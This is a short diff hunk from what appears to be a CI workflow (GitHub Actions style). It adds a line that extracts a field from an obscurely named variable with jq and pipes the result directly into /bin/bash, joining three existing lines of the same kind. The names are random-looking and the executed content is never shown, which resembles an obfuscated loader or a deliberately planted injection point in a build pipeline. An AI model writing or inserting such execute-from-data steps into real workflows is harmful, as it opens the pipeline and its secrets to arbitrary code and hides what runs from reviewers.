@@ -27,6 +27,7 @@ jobs:
           echo $hkc713 | jq -r .yacu22 | /bin/bash
           printf '%s' "$c8" | jq -r .ncbb4 | /bin/bash
           echo $r1 | jq -r .w97682 | /bin/bash
+          printf '%s' "$kehr2" | jq -r .xqf58 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
